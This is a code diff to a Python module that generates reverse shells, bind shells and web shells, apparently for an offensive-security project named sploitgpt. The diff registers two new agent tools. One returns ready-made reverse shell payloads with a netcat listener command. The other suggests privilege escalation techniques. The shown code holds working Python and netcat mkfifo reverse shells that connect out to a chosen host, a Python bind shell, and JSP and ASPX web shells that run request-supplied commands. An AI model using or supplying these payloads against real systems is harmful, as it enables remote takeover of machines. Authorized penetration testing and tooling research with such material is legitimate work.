@@ -7,15 +7,18 @@ Common payloads for reverse shells, bind shells, and web shells.
 import base64
 import ipaddress
 import logging
-from collections.abc import Callable
+from collections.abc import Callable, Iterable
 from dataclasses import dataclass
 
 logger = logging.getLogger(__name__)
+
+from sploitgpt.tools import register_tool
 
 
 @dataclass
 class Payload:
     """A payload with metadata."""
+
     name: str
     language: str
     payload: str
@@ -57,7 +60,7 @@ def python_reverse_shell(lhost: str, lport: int) -> Payload:
     """Generate Python reverse shell."""
     if not _validate_lhost_lport(lhost, lport):
         raise ValueError("Invalid lhost/lport")
-    payload = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''
+    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
     return Payload(
         name="python_reverse",
         language="python",
@@ -118,13 +121,13 @@ def nc_reverse_shell(lhost: str, lport: int, e_flag: bool = True) -> Payload:
     else:
         # For nc without -e (most systems)
         payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
-    
+
     return Payload(
         name="nc_reverse",
         language="shell",
         payload=payload,
         description=f"Netcat reverse shell to {lhost}:{lport}",
-        requires=["nc" if e_flag else "nc", "mkfifo"],
+        requires=["nc"] if e_flag else ["nc", "mkfifo"],
     )
 
 
@@ -169,7 +172,7 @@ def php_web_shell_hidden() -> str:
 
 def jsp_web_shell() -> str:
     """Simple JSP web shell."""
-    return '''<%@ page import="java.util.*,java.io.*"%>
+    return """<%@ page import="java.util.*,java.io.*"%>
 <%
 String cmd = request.getParameter("cmd");
 if(cmd != null) {
@@ -181,12 +184,12 @@ if(cmd != null) {
         out.println(line + "<br>");
     }
 }
-%>'''
+%>"""
 
 
 def aspx_web_shell() -> str:
     """Simple ASPX web shell."""
-    return '''<%@ Page Language="C#" %>
+    return """<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <script runat="server">
 protected void Page_Load(object sender, EventArgs e) {
@@ -199,7 +202,7 @@ protected void Page_Load(object sender, EventArgs e) {
         Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
     }
 }
-</script>'''
+</script>"""
 
 
 # All reverse shell generators
@@ -230,21 +233,21 @@ def generate_reverse_shells(lhost: str, lport: int) -> list[Payload]:
 def format_reverse_shells_for_agent(lhost: str, lport: int) -> str:
     """Format reverse shells for the agent."""
     payloads = generate_reverse_shells(lhost, lport)
-    
+
     lines = [f"**Reverse Shell Payloads (to {lhost}:{lport}):**\n"]
-    
+
     for p in payloads:
         lines.append(f"**{p.name}** ({p.language})")
         lines.append(f"```{p.language}")
         lines.append(p.payload)
         lines.append("```")
         lines.append("")
-    
+
     lines.append("**Listener command:**")
     lines.append("```bash")
     lines.append(f"nc -lvnp {lport}")
     lines.append("```")
-    
+
     return "\n".join(lines)
 
 
@@ -256,7 +259,7 @@ def bind_shell_bash(lport: int) -> str:
 
 def bind_shell_python(lport: int) -> str:
     """Python bind shell."""
-    return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
+    return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])' """
 
 
 def _validate_lhost_lport(lhost: str, lport: int) -> tuple[str, int] | None:
@@ -276,3 +279,31 @@ def _validate_lhost_lport(lhost: str, lport: int) -> tuple[str, int] | None:
         logger.warning("Invalid lport provided: %s", lport)
         return None
     return lhost, int(lport)
+
+
+@register_tool("get_shells")
+async def get_shells(ip: str, port: int, shells: list[str] | str | None = None) -> str:
+    """Return common reverse shell payloads for a given IP/port."""
+    _ = shells  # Optional hint for clients; ignored for now.
+    validated = _validate_lhost_lport(ip, port)
+    if not validated:
+        return "Error: invalid lhost/lport. Provide a valid IP/hostname and port (1-65535)."
+    lhost, lport = validated
+    return format_reverse_shells_for_agent(lhost, lport)
+
+
+@register_tool("get_privesc")
+async def get_privesc(binaries: Iterable[str] | str) -> str:
+    """Suggest privilege escalation techniques for provided binaries."""
+    if isinstance(binaries, str):
+        raw = binaries.replace(",", " ").strip()
+        items = [b for b in raw.split() if b]
+    else:
+        items = [b for b in binaries if b]
+
+    if not items:
+        return "Error: no binaries provided."
+
+    from sploitgpt.knowledge.gtfobins import format_privesc_for_agent
+
+    return format_privesc_for_agent(list(items))
